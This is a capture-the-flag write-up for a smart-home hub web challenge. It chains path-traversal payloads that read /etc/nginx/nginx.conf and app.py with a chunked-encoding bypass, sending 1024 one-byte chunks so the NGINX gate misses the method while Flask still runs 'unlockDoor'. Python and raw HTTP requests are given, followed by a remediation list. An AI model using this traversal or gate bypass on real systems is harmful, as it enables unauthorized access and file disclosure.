+++
title = "HopHub HubManager HM-7F3A21C4 | Chunked Body Gate Bypass"
date = "2026-10-01"
tags = ["CTF", "Web", "Chunked-Encoding", "Medium"]
description = "Normal user to front-door unlock: NGINX json_set reads method from $request_body, Flask trusts the proxy, and 1024 one-byte chunks blind the gate while Flask still sees valid JSON."
draft = false
+++

<!-- COVER TODO: save your cover as `feature.png` in this same folder (`hophub-hubmanager/feature.png`). Recommended 1200x630, same as `canon-collapse/feature.png`. Build will pick it up automatically. -->

Hey Everyone, this one is my favorite type of web challenge, no RCE, no SQLi, just two layers disagreeing about the same request bytes. Target is **HubManager 2.4.1** at `http://95.217.6.37:30001/`, box `HM-7F3A21C4`. We start as nobody, we end by making `unlockDoor` hand us the flag. 

You only get an IP + port. Box is a smart-home hub simulator:

```text
http://95.217.6.37:30001/
HubManager HM-7F3A21C4 · fw 2.4.1
nginx/1.31.6 + Flask backend, one RPC endpoint: POST /api/v1/rpc
```

**The intended chain is:**

1. Confirm up in Burp, map `POST /api/v1/rpc`.
2. Register normal `role:user`, get `session` cookie.
3. Enumerate with `listCapabilities` — find `unlockDoor/disableAlarm/factoryReset privileged`.
4. Prove direct `unlockDoor` is `403` at proxy.
5. Abuse `exportRules` traversal to read `/app/app.py` + `/etc/nginx/nginx.conf`.
6. Learn gate: `json_set $rpc_method $request_body "method"` + `client_max_body_size 1024`.
7. Burn parser-differential dead ends.
8. Send same 1024B JSON as 1024 one-byte chunks — gate blind, Flask parses, flag in `entry_code`.

# 0. Burp Setup

Project `hophub`, listener `127.0.0.1:8080`, browser proxied, target in scope `95.217.6.37:30001`, filter HTTP history to in-scope, hide CSS/images/JS.

![TODO: Burp proxy listener + scope](images/00-burp-setup.png)

> **Screenshot 00 to insert here — `images/00-burp-setup.png`:**
> Burp Proxy -> Settings showing listener Running on 127.0.0.1:8080, plus Target -> Scope with `95.217.6.37` port `30001` included. Browser proxy (FoxyProxy/Burp browser) pointing at 127.0.0.1:8080. Purpose: proves lab setup before any request.

# 1. Recon — It's Alive

```bash
curl -i http://95.217.6.37:30001/
# 302 Location: /login Server: nginx/1.31.6
```

In Burp browser visit `/`, you get bounced to `/login`.

![TODO: GET / 302](images/01-get-root-302.png)

> **Screenshot 01 to insert here — `images/01-get-root-302.png`:**
> Proxy -> HTTP history, row `GET /` selected. Request pane shows `Host: 95.217.6.37:30001`. Response pane shows `HTTP/1.1 302`, `Location: /login`, `Server: nginx/1.31.6`. Purpose: fingerprint NGINX + routing.

```text
GET /login -> 200 HubManager 2.4.1, Sign in / Create account tabs
GET /robots.txt -> 404
GET /register -> 404 (only via RPC)
```

![TODO: login page](images/02-login-page.png)

> **Screenshot 02 to insert here — `images/02-login-page.png`:**
> Burp browser rendering `/login` showing `HubManager HM-7F3A21C4 · fw 2.4.1` + Sign in / Create account. Or HTTP history row `GET /login 200` + Response preview of HTML. Purpose: shows starting UI, no creds given.

JS on that page does everything via:

```text
POST /api/v1/rpc Content-Type: application/json {"method":"..."}
```

# 2. Register — Steal a Session

On `/login` -> Create account tab, create `test1 / P@ssw0rd!x` with Intercept ON then OFF. Find it in HTTP history, Send to Repeater (Ctrl+R).

```http
POST /api/v1/rpc HTTP/1.1
Host: 95.217.6.37:30001
Content-Type: application/json
Content-Length: 67

{"method":"register","username":"test1","password":"P@ssw0rd!x"}
```

```http
HTTP/1.1 200 OK
Set-Cookie: session=<...>; HttpOnly; Path=/
Content-Type: application/json

{"ok":true,"role":"user","user":"test1"}
```

![TODO: register + session cookie](images/03-register-session.png)

> **Screenshot 03 to insert here — `images/03-register-session.png`:**
> Repeater tab with above request, Response shows `200 {"ok":true,"role":"user"}` and `Set-Cookie: session=...` header highlighted. Keep this cookie — use Repeater Cookies jar for all next tabs. Purpose: proves any user works, gate is nginx-only.

Same shape for login: `{"method":"login","username":"...","password":"..."}`.

# 3. Enumerate — listCapabilities Is the Blueprint

In Repeater, keep headers:

```http
POST /api/v1/rpc HTTP/1.1
Host: 95.217.6.37:30001
Content-Type: application/json
Cookie: session=<from-step-2>
```

Try one per tab:

```json
{"method":"whoami"}
{"method":"getHubInfo"}
{"method":"listDevices"}
{"method":"listCapabilities"}
{"method":"getState","device":"front_door"}
```

<img width="1490" height="676" alt="image" src="https://github.com/user-attachments/assets/55147e5c-f8eb-47b8-8657-29c884358bf6" />

> **Screenshot 04 to insert here — `images/04-listCapabilities.png`:**
> Repeater `{"method":"listCapabilities"}` -> `200` JSON with `unlockDoor/disableAlarm/factoryReset` all `"scope":"privileged"` visible. Highlight those three lines. Purpose: exposes target methods.

<img width="1286" height="720" alt="Screenshot 2026-10-01 183535" src="https://github.com/user-attachments/assets/a0dae21f-f9d0-4801-bdee-6713385182f3" />

> **Screenshot 05 to insert here — `images/05-listDevices.png`:**
> Repeater `{"method":"listDevices"}` -> shows `front_door` with `type:lock`. Purpose: tells us which device arg passes handler check later.

**What does this mean?**

App *tells* a low-priv user about privileged methods. `scope` looks like docs, not enforcement. Who blocks us?

# 4. Prove the Gate — Direct unlockDoor = 403

```http
POST /api/v1/rpc HTTP/1.1
Host: 95.217.6.37:30001
Content-Type: application/json
Cookie: session=<yours>

{"method":"unlockDoor","device":"front_door"}
```

```http
HTTP/1.1 403 Forbidden

{"error":"method not permitted"}
```

![TODO: direct unlockDoor 403](images/06-unlockDoor-403.png)

> **Screenshot 06 to insert here — `images/06-unlockDoor-403.png`:**
> Repeater request exactly as above, Response `403 {"error":"method not permitted"}`. Show full status line. Purpose: most important negative result — gate is active before Flask dispatch. Also try `disableAlarm` -> same 403 if you want second row.

# 5. Source Disclosure — exportRules Traversal

Method `exportRules` takes export name and does `join(export_dir, name)` with no `..` check.

```json
{"method":"exportRules","name":"../../../../app/app.py"}
{"method":"exportRules","name":"../../../../etc/nginx/nginx.conf"}
```

![TODO: nginx.conf leak](images/07-nginx-conf.png)

> **Screenshot 07 to insert here — `images/07-nginx-conf.png`:**
> Repeater `exportRules` for `../../../../etc/nginx/nginx.conf`, Response JSON containing file text. Highlight: `client_max_body_size 1024;`, `client_body_buffer_size 1024;`, `json_set $rpc_method $request_body "method";`, `map $rpc_method $is_restricted` with `unlockDoor 1; disableAlarm 1; factoryReset 1;`. Use Repeater Search (Ctrl+F) for `json_set`. Purpose: reveals proxy-only auth + 1024 boundary.

Recovered gate:

```nginx
client_max_body_size 1024;
client_body_buffer_size 1024;
json_set $rpc_method $request_body "method";
map $rpc_method $is_restricted {
  "unlockDoor" 1;
  "disableAlarm" 1;
  "factoryReset" 1;
  default 0;
}
```

![TODO: app.py leak](images/08-app-py.png)

> **Screenshot 08 to insert here — `images/08-app-py.png`:**
> Repeater `exportRules` for `../../../../app/app.py`, Response containing `def unlockDoor` / `entry_code` / `FLAG` / `_secret("flag"` + `unlink`. Highlight `entry_code: FLAG` and `device type == lock` + `duration default 60`. Purpose: shows backend trusts proxy, flag deleted from disk (`/run/hub/flag` gone after boot), must steal from memory via RPC.

Flask summary:

```python
body.decode('utf-8') # UTF-16/32 die here
json.loads(..., object_pairs_hook=reject_duplicates) # dup keys -> malformed
keys must be in method allowlist
login required except login/register/logout/whoami
unlockDoor: device must exist + type==lock, duration finite float, return entry_code=FLAG
```

**What does this mean?**

* No role check. Logged-in = can call `unlockDoor` if proxy lets through.
* `$request_body` empty / `json_set` fail -> `$rpc_method` empty -> `default 0` -> allow. Fail-open.
* `1024` twice is screaming buffer-boundary.

# 6. Dead Ends — Why JSON Tricks Die

Quick Repeater checks, one screenshot is enough:

| Payload | Result |
|---|---|
| Same JSON + 979 spaces, `Content-Length: 1024` | still `403` — padding alone not bypass |
| `{"method":"unlockDoor","method":"whoami"}` | `malformed request` — duplicate hook |
| last=`unlockDoor` dup | `403` — NGINX reads last |
| deep nesting, `NaN/Infinity/1e309`, surrogates, `\u0000` | gate maybe blind, Flask rejects finite/scalar/utf-8 checks |
| `CL+TE` together | `400` |
| case / `%2f` / trailing slash | `404` or still blocked |

![TODO: padded 1024 still 403](images/09-padded-403.png)

> **Screenshot 09 to insert here — `images/09-padded-403.png`:**
> Repeater with `Content-Length: 1024` body = `{"method":"unlockDoor","device":"front_door"}` + trailing spaces to exactly 1024B, Response still `403`. Purpose: proves size alone is not bypass, need framing change. Show Content-Length header + body length in Inspector.

**What does this mean?**

Everything that blinds NGINX JSON also breaks Flask strict validation. Stop changing JSON meaning. Keep JSON 100% valid, change delivery.

# 7. The Bypass — Same Body, Different Framing

Insight: `$request_body` is empty when body spooled to temp file. Chunked bodies skip the `allocate one buffer` fast path, stream + spill, `json_set` sees nothing, but proxy still forwards file upstream.

Decoded entity exactly `1024B` (under `client_max_body_size`, not over):

```text
45B  {"method":"unlockDoor","device":"front_door"}
+ 979B trailing spaces — legal JSON whitespace
= 1024B, no duration -> default 60
```

On wire as 1024 x 1-byte chunks:

```text
"1\r\n" + 1 byte + "\r\n" = 6 bytes per chunk
1024*6 + 5 ("0\r\n\r\n") = 6149 wire bytes
```

Generate once for Repeater paste:

```bash
python3 -c "
body=b'{\"method\":\"unlockDoor\",\"device\":\"front_door\"}'+b' '*(1024-45)
open('/tmp/body.bin','wb').write(b''.join(b'1\r\n'+bytes([b])+b'\r\n' for b in body)+b'0\r\n\r\n')
"
wc -c /tmp/body.bin # 6149
```

Repeater setup:

```http
POST /api/v1/rpc HTTP/1.1
Host: 95.217.6.37:30001
Content-Type: application/json
Cookie: session=<yours>
Transfer-Encoding: chunked
Connection: close
# NO Content-Length — wrench icon -> UNCHECK Update Content-Length
```

Body = raw bytes of `/tmp/body.bin`, preserve `\r\n`, no extra newline.

![TODO: chunked request headers](images/10-chunked-request.png)

> **Screenshot 10 to insert here — `images/10-chunked-request.png`:**
> Repeater request pane: headers show `Transfer-Encoding: chunked`, `Connection: close`, NO `Content-Length`, `Cookie: session=...`. Body starts with `1\r\n{\r\n1\r\n"\r\n...` visible. If Burp wraps, show Hex view first bytes + total wire `6149`. Purpose: proves framing, not JSON, is the exploit.

![TODO: flag response](images/11-flag-200.png)

> **Screenshot 11 to insert here — `images/11-flag-200.png`:**
> Same Repeater tab Response: `HTTP/1.1 200 OK` + `{"device":"front_door","lock":"released","entry_code":"FahemSec{Ng1nx_1.31.5_h4d_1nt3r3st1ng_Upd4t3s_12af44ed23}","expires_in":60,"ok":true}`. Highlight `entry_code`. Purpose: win condition. If Repeater normalizes chunks, screenshot terminal `python3 HubManger_solver.py` output instead showing `HTTP response: HTTP/1.1 200 OK / Decoded 1024 / Wire 6149 / Flag: FahemSec{...}`.

Guaranteed raw-socket version (use if Repeater mangles `\r\n`):

```bash
python3 HubManger_solver.py --url http://95.217.6.37:30001
# HTTP response: HTTP/1.1 200 OK
# Decoded JSON body: 1024 bytes
# Chunked body on wire: 6149 bytes
# Flag: FahemSec{Ng1nx_1.31.5_h4d_1nt3r3st1ng_Upd4t3s_12af44ed23}
```

**Why it works:**

| Layer | It does | It sees | Verdict |
|---|---|---|---|
| NGINX HTTP | de-chunks 1024x1B | decoded 1024B <= max, no 413 | inspect |
| NGINX json_set | reads `$request_body` | missing (file-backed/fragmented) | `default 0`, no 403 |
| NGINX proxy | forwards from temp file | intact JSON | to Flask |
| Flask | `json.loads` flat object | `unlockDoor/front_door/60` | `entry_code: FLAG` |

# The Takeaway

Whole challenge is one idea: **proxy does not see what backend consumes**. Auth from best-effort variable that silently disappears on buffering change = fail-open.

Fix that kills class:

1. Enforce in Flask. `privileged` must be checked, not listed.
2. Fail closed. Empty method / parse fail / missing `$request_body` on JSON POST -> `400`.
3. Test whole path: `CL` vs chunked, many-small-chunks, `1023/1024/1025`, dup keys, deep JSON, bad unicode.
4. Alert when JSON POST proxied without extracted method.

Happy Hacking :)

# Appendix — Copy-Paste for Repeater

```http
POST /api/v1/rpc HTTP/1.1
Host: 95.217.6.37:30001
Content-Type: application/json
Cookie: session=REPLACE

{"method":"listCapabilities"}
```

```http
POST /api/v1/rpc HTTP/1.1
Host: 95.217.6.37:30001
Content-Type: application/json
Cookie: session=REPLACE

{"method":"unlockDoor","device":"front_door"}
```

```json
{"method":"exportRules","name":"../../../../etc/nginx/nginx.conf"}
{"method":"exportRules","name":"../../../../app/app.py"}
```

Wire math: `1024 chunks * 6 + 5 = 6149`.
